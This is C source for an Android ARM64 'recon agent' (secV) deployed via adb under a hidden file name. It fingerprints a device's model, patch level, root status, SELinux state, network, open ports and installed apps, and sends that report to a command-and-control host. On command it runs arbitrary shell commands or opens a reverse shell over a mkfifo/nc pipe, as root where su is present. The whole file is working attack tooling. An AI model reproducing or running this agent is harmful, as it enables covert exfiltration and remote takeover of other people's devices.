/*
 * secV on-device native recon agent v1.0
 * Standalone ARM64 binary — no libc dependency beyond bionic.
 *
 * Cross-compile:
 *   NDK: $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android34-clang \
 *        -O2 -static -o secv_agent secv_agent.c
 *   Or via build.sh in this directory.
 *
 * Deploy:
 *   adb push secv_agent /data/local/tmp/._sa
 *   adb shell chmod 755 /data/local/tmp/._sa
 *   adb shell /data/local/tmp/._sa 192.168.1.100 8889
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>

/* Android-specific: read system properties */
#ifdef __ANDROID__
  #include <sys/system_properties.h>
  static void get_prop(const char *key, char *val, size_t sz) {
      __system_property_get(key, val);
      (void)sz;
  }
#else
  static void get_prop(const char *key, char *val, size_t sz) {
      snprintf(val, sz, "unknown");
      (void)key;
  }
#endif

#define PROP(k,v) get_prop(k, v, sizeof(v))
#define BUFSIZE   8192
#define JSON_SIZE 16384

static char json_buf[JSON_SIZE];
static char cmd_buf[BUFSIZ];

/* Read first N bytes from a file into buf */
static int readfile(const char *path, char *buf, size_t sz) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sz - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    /* strip newline */
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';
    return (int)n;
}

/* Run shell command and capture output */
static int runcmd(const char *cmd, char *out, size_t outsz) {
    FILE *fp = popen(cmd, "r");
    if (!fp) { out[0] = '\0'; return -1; }
    size_t n = fread(out, 1, outsz - 1, fp);
    pclose(fp);
    out[n] = '\0';
    /* strip trailing newlines */
    for (ssize_t i = (ssize_t)n - 1; i >= 0 && (out[i] == '\n' || out[i] == '\r'); i--)
        out[i] = '\0';
    return (int)n;
}

/* Escape JSON string in-place (replaces buf) — minimal: only quotes and backslashes */
static void json_esc(char *buf, size_t sz) {
    char tmp[JSON_SIZE] = {0};
    size_t j = 0;
    for (size_t i = 0; buf[i] && j < sz - 2; i++) {
        if (buf[i] == '"' || buf[i] == '\\') tmp[j++] = '\\';
        tmp[j++] = buf[i];
    }
    strncpy(buf, tmp, sz - 1);
    buf[sz - 1] = '\0';
}

/* Check if file exists */
static int fexists(const char *path) {
    return access(path, F_OK) == 0;
}

/* TCP connect to C2 and return fd, or -1 */
static int c2_connect(const char *host, int port) {
    struct sockaddr_in sa;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* ─── main ─────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    const char *c2_host = (argc > 1) ? argv[1] : "127.0.0.1";
    int         c2_port = (argc > 2) ? atoi(argv[2]) : 8889;
    const char *mode    = (argc > 3) ? argv[3] : "recon";

    /* ── gather properties ── */
    char model[PROP_VALUE_MAX]   = {0};
    char mfr[PROP_VALUE_MAX]     = {0};
    char android[PROP_VALUE_MAX] = {0};
    char sdk[PROP_VALUE_MAX]     = {0};
    char patch[PROP_VALUE_MAX]   = {0};
    char chipset[PROP_VALUE_MAX] = {0};
    char arch[PROP_VALUE_MAX]    = {0};
    char build[256]              = {0};
    char bootlocked[16]          = {0};

    PROP("ro.product.model",            model);
    PROP("ro.product.manufacturer",     mfr);
    PROP("ro.build.version.release",    android);
    PROP("ro.build.version.sdk",        sdk);
    PROP("ro.build.version.security_patch", patch);
    PROP("ro.board.platform",           chipset);
    PROP("ro.product.cpu.abi",          arch);
    PROP("ro.boot.flash.locked",        bootlocked);
    PROP("ro.build.fingerprint",        build);

    char kernel[128] = {0};
    readfile("/proc/version", kernel, sizeof(kernel));

    /* ── root detection ── */
    const char *su_paths[] = {
        "/system_ext/bin/su", "/debug_ramdisk/su", "/system/bin/su",
        "/system/xbin/su",    "/data/adb/magisk/su", "/sbin/su",
        NULL
    };
    char root_status[256] = "none";
    char root_bin[128]    = {0};
    for (int i = 0; su_paths[i]; i++) {
        if (fexists(su_paths[i])) {
            char test_cmd[256];
            char test_out[64] = {0};
            snprintf(test_cmd, sizeof(test_cmd), "%s -c id 2>/dev/null", su_paths[i]);
            runcmd(test_cmd, test_out, sizeof(test_out));
            if (strstr(test_out, "uid=0")) {
                snprintf(root_status, sizeof(root_status), "rooted");
                strncpy(root_bin, su_paths[i], sizeof(root_bin) - 1);
                break;
            }
        }
    }
    /* Check Magisk daemon */
    if (system("pgrep -x magiskd >/dev/null 2>&1") == 0) {
        strncat(root_status, "|magiskd", sizeof(root_status) - strlen(root_status) - 1);
    }
    /* KernelSU */
    if (fexists("/dev/ksud") || fexists("/data/adb/ksud")) {
        strncat(root_status, "|kernelsu", sizeof(root_status) - strlen(root_status) - 1);
    }

    /* ── SELinux ── */
    char selinux[32] = "unknown";
    readfile("/sys/fs/selinux/enforce", selinux, sizeof(selinux));
    if (selinux[0] == '1')      strncpy(selinux, "Enforcing",  sizeof(selinux) - 1);
    else if (selinux[0] == '0') strncpy(selinux, "Permissive", sizeof(selinux) - 1);

    /* ── network ── */
    char ip[64]    = {0};
    char gw[64]    = {0};
    char ports[256]= {0};
    char adb_tcp[16]= {0};
    runcmd("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1", ip, sizeof(ip));
    if (!ip[0]) runcmd("ip route get 1.1.1.1 2>/dev/null | grep src | awk '{for(i=1;i<=NF;i++) if($i==\"src\") print $(i+1)}'", ip, sizeof(ip));
    runcmd("ip route 2>/dev/null | grep default | awk '{print $3}' | head -1", gw, sizeof(gw));
    runcmd("ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,\":\");if(a[2]+0>0)printf a[2]\",\"}'", ports, sizeof(ports));
    PROP("service.adb.tcp.port", adb_tcp);

    /* ── installed packages ── */
    char pkgs_count[16] = {0};
    runcmd("pm list packages 2>/dev/null | wc -l", pkgs_count, sizeof(pkgs_count));
    char pkgs[2048]  = {0};
    runcmd("pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\\n' ',' | sed 's/,$//'", pkgs, sizeof(pkgs));

    /* ── termux ── */
    int has_termux      = fexists("/data/data/com.termux");
    int has_termux_boot = (system("pm path com.termux.boot >/dev/null 2>&1") == 0);

    /* ── escape strings ── */
    json_esc(model,   sizeof(model));
    json_esc(kernel,  sizeof(kernel));
    json_esc(build,   sizeof(build));
    json_esc(pkgs,    sizeof(pkgs));

    /* ── build JSON ── */
    snprintf(json_buf, sizeof(json_buf),
        "{"
        "\"agent\":\"secV_native/1.0\","
        "\"mode\":\"%s\","
        "\"device\":{"
            "\"model\":\"%s\",\"manufacturer\":\"%s\","
            "\"android\":\"%s\",\"sdk\":%s,"
            "\"security_patch\":\"%s\",\"chipset\":\"%s\","
            "\"arch\":\"%s\",\"kernel\":\"%s\","
            "\"root\":\"%s\",\"root_bin\":\"%s\","
            "\"selinux\":\"%s\",\"bootlocked\":\"%s\","
            "\"build\":\"%s\""
        "},"
        "\"network\":{"
            "\"ip\":\"%s\",\"gateway\":\"%s\","
            "\"adb_tcp_port\":\"%s\",\"open_ports\":\"%s\""
        "},"
        "\"packages\":{\"count\":%s,\"third_party\":\"%s\"},"
        "\"attack_surface\":{"
            "\"termux\":%s,\"termux_boot\":%s"
        "}"
        "}",
        mode,
        model, mfr, android, sdk,
        patch, chipset, arch, kernel,
        root_status, root_bin, selinux, bootlocked, build,
        ip, gw, adb_tcp, ports,
        pkgs_count, pkgs,
        has_termux  ? "true" : "false",
        has_termux_boot ? "true" : "false"
    );

    /* ── print to stdout (always, so ADB captures it) ── */
    puts(json_buf);
    fflush(stdout);

    /* ── send to C2 ── */
    int fd = c2_connect(c2_host, c2_port);
    if (fd >= 0) {
        /* Send report */
        size_t len = strlen(json_buf);
        send(fd, json_buf, len, 0);
        send(fd, "\n", 1, 0);

        /* If mode=exploit or c2: wait for instruction */
        if (strcmp(mode, "exploit") == 0 || strcmp(mode, "c2") == 0) {
            ssize_t n = recv(fd, cmd_buf, sizeof(cmd_buf) - 1, 0);
            if (n > 0) {
                cmd_buf[n] = '\0';
                /* Parse: {"cmd":"SH:<shell cmd>"} or {"cmd":"SHELL:<host>:<port>"} */
                char *cmd_start = strstr(cmd_buf, "\"cmd\":\"");
                if (cmd_start) {
                    cmd_start += 7;
                    char *cmd_end = strchr(cmd_start, '"');
                    if (cmd_end) {
                        *cmd_end = '\0';
                        if (strncmp(cmd_start, "SH:", 3) == 0) {
                            system(cmd_start + 3);
                        } else if (strncmp(cmd_start, "SHELL:", 6) == 0) {
                            /* host:port → "host port" for Android toybox nc */
                            char addr[256];
                            strncpy(addr, cmd_start + 6, sizeof(addr) - 1);
                            addr[sizeof(addr) - 1] = '\0';
                            char *col = strrchr(addr, ':');
                            if (col) *col = ' ';
                            char rev[512];
                            snprintf(rev, sizeof(rev),
                                "f=$(mktemp -u /data/local/tmp/._svXXXXXX) && mkfifo \"$f\" && "
                                "/system/bin/sh -i <\"$f\" | nc %s >\"$f\" 2>/dev/null & "
                                "rm -f \"$f\" 2>/dev/null",
                                addr);
                            system(rev);
                        } else if (strncmp(cmd_start, "ROOT_SHELL:", 11) == 0 && root_bin[0]) {
                            char addr[256];
                            strncpy(addr, cmd_start + 11, sizeof(addr) - 1);
                            addr[sizeof(addr) - 1] = '\0';
                            char *col = strrchr(addr, ':');
                            if (col) *col = ' ';
                            char rev[512];
                            snprintf(rev, sizeof(rev),
                                "f=$(mktemp -u /data/local/tmp/._svXXXXXX) && mkfifo \"$f\" && "
                                "%s -c \"/system/bin/sh -i <$f | nc %s >$f 2>/dev/null\" & "
                                "rm -f \"$f\" 2>/dev/null",
                                root_bin, addr);
                            system(rev);
                        }
                    }
                }
            }
        }
        close(fd);
    }

    return 0;
}
